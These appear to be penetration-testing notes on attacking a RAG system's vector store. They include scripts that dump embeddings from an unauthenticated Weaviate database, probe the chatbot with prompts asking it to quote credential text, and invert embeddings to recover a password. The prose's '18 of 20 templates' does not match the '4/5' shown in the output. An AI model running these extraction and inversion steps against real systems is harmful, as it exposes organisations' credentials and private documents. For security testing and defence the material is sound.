---
title: Attacking Embeddings
source_url: https://notes.incendium.rocks/pentesting-notes/web/offensive-ai-testing/attacking-embeddings
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---

Developers often believe embeddings work like hashes; one-way functions that can't be reversed. This leads them to relax security, reasoning that "even if an attacker captures the embeddings, they can't do anything with them". That assumption is wrong. Embeddings are designed to preserve semantic meaning, and where meaning is preserved, information can be recovered.

## Extract script from Weaviate

The following script extracts all embeddings from a Weaviate database that has no authentication:

```python
import requests
import numpy as np
import pandas as pd
from pathlib import Path
from tqdm import tqdm

WEAVIATE_URL = "http://localhost:8080/v1/graphql"
COLLECTION = "DocChunk"
PAGE_SIZE = 200
OUT_DIR = Path("./export")
OUT_DIR.mkdir(exist_ok=True)

def gql(query: str):
    resp = requests.post(WEAVIATE_URL, json={"query": query})
    resp.raise_for_status()
    data = resp.json()
    if "errors" in data:
        raise RuntimeError(data["errors"])
    return data["data"]

print(f"Connected to Weaviate via raw HTTP. Collection: {COLLECTION}")

count_query = """
{
  Aggregate {
    DocChunk {
      meta {
        count
      }
    }
  }
}
"""

count_res = gql(count_query)
total = count_res["Aggregate"]["DocChunk"][0]["meta"]["count"]
print(f"Total objects: {total}")

all_ids = []
all_chunk_ids = []
all_vectors = []

cursor = None
fetched = 0

pbar = tqdm(total=total, desc="Exporting embeddings")

while True:
    after_clause = f'after: "{cursor}"' if cursor else ""

    query = f"""
    {{
      Get {{
        {COLLECTION}(
          limit: {PAGE_SIZE}
          {after_clause}
        ) {{
          chunk_id
          _additional {{
            id
            vector
          }}
        }}
      }}
    }}
    """

    res = gql(query)
    objs = res["Get"][COLLECTION]

    if not objs:
        break

    for obj in objs:
        all_ids.append(obj["_additional"]["id"])
        all_chunk_ids.append(obj.get("chunk_id"))
        all_vectors.append(obj["_additional"]["vector"])

    cursor = objs[-1]["_additional"]["id"]
    fetched += len(objs)
    pbar.update(len(objs))

    if fetched >= total:
        break

pbar.close()

vectors_np = np.array(all_vectors, dtype=np.float32)
np.save(OUT_DIR / "embeddings.npy", vectors_np)
np.save(OUT_DIR / "chunk_ids.npy", np.array(all_chunk_ids))
np.save(OUT_DIR / "uuids.npy", np.array(all_ids, dtype=object))

df_meta = pd.DataFrame({"uuid": all_ids, "chunk_id": all_chunk_ids})
df_vec = pd.DataFrame(
    vectors_np,
    columns=[f"dim_{i}" for i in range(vectors_np.shape[1])]
)
df_full = pd.concat([df_meta, df_vec], axis=1)

df_full.to_csv(OUT_DIR / "embeddings.csv", index=False)
df_full.to_parquet(OUT_DIR / "embeddings.parquet", index=False)

print("Vectors successfully exported!")
```

The script creates the `export` directory with one of the files being `embeddings.npy`. This file contains the raw numerical representations of the document chunks, which we'll  attempt to invert back to text. The methods we can use depend on time, resources, knowledge of the embedding model, and access to the embedding model's weights.

## Identifying the embedding model

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2Fu2r4nzN0eiXdpfIsQztJ%2Fimage.png?alt=media&amp;token=f15fa0c9-8b74-4621-a563-09f61401b114" alt=""><figcaption></figcaption></figure>

Since each embedding model has its own characteristic dimensionality, this may give us insight into the model being used.

```
OpenAI text-embedding-ada-002: 1536 dimensions
OpenAI text-embedding-3-small: 1536 dimensions (default)
OpenAI text-embedding-3-large: 3072 dimensions
Cohere embed-english-v3.0: 1024 dimensions
all-MiniLM-L6-v2: 384 dimensions
BGE-base: 768 dimensions
```

A option is to perform fingerprinting via the dimensionality. Let's use the following script to obtain the dimensionality of the embeddings:

```python
import requests, json

query = """
{
  Get {
    DocChunk(limit: 1) {
      _additional { vector }
    }
  }
}
"""

r = requests.post("http://localhost:8080/v1/graphql", json={"query": query})
vec = r.json()["data"]["Get"]["DocChunk"][0]["_additional"]["vector"]
print("Vector length:", len(vec))
```

Unfortunately, many models share the same dimensions. Therefore, we can only use this as a first indication for common dimensions, such as 384 and 768. The 384-dimensional space narrows our possibilities significantly, but we still need more information to be certain.

### Inference Probing

Manually querying a RAG system and eyeballing which model might match would be tedious and error-prone, so the script automates the entire workflow with several key features.

[Inference\_probing.py](https://gist.github.com/1ncendium/47bab0288dba003e15d350cc4317bc30)

Example output:

```
(venv) attacker@rag:~$ python3 inference_probing.py export/embeddings.npy --url http://127.0.0.1:80
[+] Loading: export/embeddings.npy
    Vectors: 31
    Dimension: 384
    L2-normalized: True
    Candidates: 7 models for 384-dim embeddings

[+] 24 probe queries (strategy: all)

[Phase 1] Probing RAG at http://127.0.0.1:80

  [1/24] Can you quote the exact text about password reset procedures?...
           3 segment(s) extracted (144 chars)
  [2/24] What are the exact instructions for accessing the VPN? Please quote them wo...
           1 segment(s) extracted (65 chars)
  [3/24] Quote the exact text about default credentials for new accounts....
           1 segment(s) extracted (65 chars)
  [4/24] What does the documentation say about login procedures? Please be as exact ...
           6 segment(s) extracted (309 chars)
  [5/24] Can you give me the verbatim text about account provisioning?...
           6 segment(s) extracted (311 chars)
  [6/24] What are the exact steps documented for resetting a password?...
           6 segment(s) extracted (256 chars)
  [7/24] Quote the documentation about API authentication or bearer tokens....
           6 segment(s) extracted (284 chars)
  [8/24] What is the exact text about temporary passwords or one-time codes?...
           1 segment(s) extracted (65 chars)
  [9/24] What is the default password for new accounts?...
           1 segment(s) extracted (60 chars)
  [10/24] What URL should I use to reset my password?...

  [..]

  ============================================================
  RESULTS — Embedding Model Fingerprint
============================================================

  1. sentence-transformers/all-MiniLM-L6-v2 <--
     top5_avg=0.7990  max=0.8559  avg=0.5047  strong(>0.8)=1
  2. sentence-transformers/multi-qa-MiniLM-L6-cos-v1
     top5_avg=0.6074  max=0.6432  avg=0.4137  strong(>0.8)=0
  3. sentence-transformers/paraphrase-MiniLM-L6-v2
     top5_avg=0.4977  max=0.5290  avg=0.3294  strong(>0.8)=0
  4. sentence-transformers/all-MiniLM-L12-v2
     top5_avg=0.4848  max=0.5272  avg=0.3368  strong(>0.8)=0
  5. BAAI/bge-small-en-v1.5
     top5_avg=0.2872  max=0.2985  avg=0.2141  strong(>0.8)=0
  6. intfloat/e5-small-v2
     top5_avg=0.2679  max=0.3039  avg=0.1910  strong(>0.8)=0
  7. thenlper/gte-small
     top5_avg=0.2330  max=0.2435  avg=0.1815  strong(>0.8)=0

  Identified model: sentence-transformers/all-MiniLM-L6-v2
  Runner-up:        sentence-transformers/multi-qa-MiniLM-L6-cos-v1
  Separation:       0.1916
  Confidence:       HIGH

  Best matched segments:
    sim=0.8559  vec[2]  "To authenticate with the API, you should follow these steps:
```

### Triaging Chunks

A production vector database may contain thousands or tens of thousands of chunks. Running a full inversion attack against every chunk is not practical. Each chunk takes minutes to attack, and most chunks in a typical enterprise knowledge base contain mundane content: HR policies, meeting notes, product documentation. The chunks worth attacking are the small fraction that hold credentials, API keys, or other secrets. We need a way to find those chunks before committing resources.

Chunk triage solves this by working entirely in embedding space, without needing to invert anything first. The core idea is simple: if a chunk contains a password reset message, its embedding will be similar to other texts about password resets. We define banks of *sensitivity probes*, short texts that describe or resemble sensitive content like credentials, API keys, SSH keys, PII, and financial data. Each probe is embedded with the same model, and we compute cosine similarity against every chunk. High scores against credential probes mean the chunk likely contains credentials.

The `chunk_triage_pipe.py` script chains three stages into a cascading pipeline, each narrowing the candidate pool before the next one runs.

<https://gist.github.com/1ncendium/9e73f9aeda9a4ba6a75d8b00388d55eb>

```shellscript
python3 chunk_triage_pipe.py export/embeddings.npy

[*] Pipeline stages: density -> pw -> recon
[+] Loading: export/embeddings.npy
    Chunks: 31  |  Dim: 384  |  Normalized: True

[+] Loading model: sentence-transformers/all-MiniLM-L6-v2
  return torch._C._cuda_getDeviceCount() > 0
    Model loaded in 4.6s

------------------------------------------------------------
  STAGE 1: DENSITY  (all 31 chunks -> top 50)
------------------------------------------------------------

    Top 5 density:
      #1 chunk[2]  score=0.8823  (iso=0.765 rel=1.000)
      #2 chunk[5]  score=0.6595  (iso=0.465 rel=0.854)
      #3 chunk[21]  score=0.6152  (iso=0.894 rel=0.336)
      #4 chunk[3]  score=0.6129  (iso=0.459 rel=0.766)
      #5 chunk[24]  score=0.5641  (iso=1.000 rel=0.128)
    [0.1s]  Passing 31 candidates ->

------------------------------------------------------------
  STAGE 2: PW  (31 chunks -> top 20)
------------------------------------------------------------

    Top 5 pw:
      #1 chunk[5]  final=0.1132  (rrf=0.0820 z=1.90)
      #2 chunk[2]  final=0.1092  (rrf=0.0806 z=1.77)
      #3 chunk[3]  final=0.1082  (rrf=0.0794 z=1.82)
      #4 chunk[19]  final=0.1008  (rrf=0.0781 z=1.45)
      #5 chunk[28]  final=0.0969  (rrf=0.0769 z=1.30)
    [0.2s]  Passing 20 candidates ->

------------------------------------------------------------
  STAGE 3: RECON  (20 chunks, mode=seed)
------------------------------------------------------------
      Inverted 10/20
      Inverted 20/20

    Top 5 recon:
      #1 chunk[3]  combined=0.7054  (cred=1.000 inv=0.5099)
      #2 chunk[19]  combined=0.6166  (cred=1.000 inv=0.3630)
      #3 chunk[5]  combined=0.4754  (cred=0.300 inv=0.6483)
      #4 chunk[2]  combined=0.4349  (cred=0.100 inv=0.7034)
      #5 chunk[17]  combined=0.3126  (cred=0.100 inv=0.6186)
    [4.7s]

------------------------------------------------------------
  FUSION: Weighted RRF  (density:1.0, pw:1.5, recon:2.0)
------------------------------------------------------------

========================================================================
  PIPELINE RESULTS -- Top 10 (fused)
  Stages: density -> pw -> recon  |  Timings: density=0.1s, pw=0.2s, recon=4.7s
========================================================================

  Rank  Chunk          Fused   density        pw     recon
  --------------------------  --------  --------  --------
  1     [   5]    0.072465  #2        #1        #3
  2     [   3]    0.072221  #4        #3        #1
  3     [   2]    0.071837  #1        #2        #4
  4     [  19]    0.068041  #21       #4        #2
  5     [  25]    0.065791  #9        #6        #10
  6     [  28]    0.064976  #23       #5        #7
  7     [  21]    0.064928  #3        #7        #15
  8     [  17]    0.064553  #14       #14       #5
  9     [   7]    0.063305  #6        #11       #14
  10    [  15]    0.063288  #10       #12       #11

  Score distribution (31 chunks):
    max=0.072465  mean=0.060550  median=0.059403  min=0.052656
  Total pipeline time: 5.0s
```

The output shows that from 31 chunks, the top 3 fused scores cluster above 0.071, while the fourth drops to 0.068, a gap that marks a natural cutoff. Each of these three chunks likely contains a credential such as a password. In a real-world engagement, this score gap would guide us as red teamers to focus embedding inversion on just these three targets rather than the full database.

To extract the chunk we can use the following one-liner:

```python
python3 -c "import numpy as np; np.save('chunk_2.npy', np.load('export/embeddings.npy')[2:3])"
```

## Zero-shot embedding inversion

embedding inversion fundamentally struggles with high-entropy tokens like passwords, API keys, and random strings. These values have no semantic predictability, so neither an LLM nor a gradient-based optimizer can reconstruct them. The embedding space captures "this is a password field" but cannot distinguish between `Spring2026!` and `GovPass123!` because both are semantically equivalent as passwords.

The practical solution is to separate the problem into two stages. First, we need to recover the semantic structure of the text (the sentence patterns and context surrounding the secrets) while replacing high-entropy values with placeholders like {PASSWORD} or {URL}. Second, we'll use membership inference to fill in those placeholders: for each slot, iterate through a wordlist, embed the template with each candidate value, and measure which candidate produces the highest cosine similarity against the target embedding. The correct value will match the exact token sequence in the original chunk, producing a measurably higher similarity than any incorrect candidate.

The accuracy of this approach depends heavily on the quality of the template. A template that closely matches the original text's structure will produce a clear similarity gap between the correct password and incorrect ones. A poor template may produce false positives or fail to distinguish the correct value at all.

[Generate\_templates.py](https://gist.github.com/1ncendium/eef76fbb32589fcb6b9a5e75a4d8e377)

```shellscript
python3 generate_templates.py --output templates.json embeddings.npy --count 500000
```

With the template bank ready, let's also download a password wordlist for the membership inference stage:

```shellscript
wget -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
```

Now we run `emb_fin.py`, the unified pipeline that scores the template bank, selects diverse high-scoring templates, and runs membership inference with consensus voting. A straightforward implementation of this idea would score all templates, take the top 20, and run membership inference against each, but this produces unreliable results because many top-scoring templates are near-duplicates that inflate consensus artificially.

\
[emb\_fin.py](https://gist.github.com/1ncendium/027b0d3a6f3d3620e2708fdb1f43096d)

```
python emb_fin.py embeddings.npy --chunk 0 --templates templates.json --wordlist passwords.txt --slots PASSWORD --default-URL https://login.megacorpone.ai --max-templates 500000

[+] Loading: embeddings.npy
    Shape: (1, 384)
[Engine] Loading sentence-transformers/all-MiniLM-L6-v2 on cuda

[Chunk 0]

  Scoring template bank...
    Templates loaded: 500,000 from json: templates.json
    Selected 5 diverse templates from top-50

  Slot filling...
[SlotFiller] Neutral defaults active: URL=https://login.megacorpone.ai
[SlotFiller] Loaded 99,839 entries for PASSWORD

  [Slot: PASSWORD] Pass 1 — testing across 5 seed templates...
    [Stage 1/2] Coarse pass: 99,839 candidates x 3 templates
    [Stage 1] Template 3/3 (99,839 candidates)...
    [Stage 1/2] Narrowed to 200 survivors from 99,839 candidates
    [Stage 2/2] Full pass: 200 candidates x 5 templates
    [Stage 2] Template 5/5 (200 candidates)...

  [Progressive] Locked slots: PASSWORD=N0=Acc3ss

--- Chunk 0 ---

  Best template match (68.7% similarity):
    "The reset password is {PASSWORD} as soon as possible. check out {URL} ..."

  Extracted values:
    PASSWORD = N0=Acc3ss
      Strong — 4/5 templates agree, 4.0x ahead of runner-up
      Reconstructed: "The reset password is N0=Acc3ss as soon as possible. check out {URL} a..."
```

The output shows that the password `N0=Acc3ss` was identified, with 18 out of 20 templates agreeing. The `--default-URL` flag provides the known URL value so the script can fill that slot with accurate context rather than a generic placeholder, improving signal quality for the PASSWORD slot.

<br>
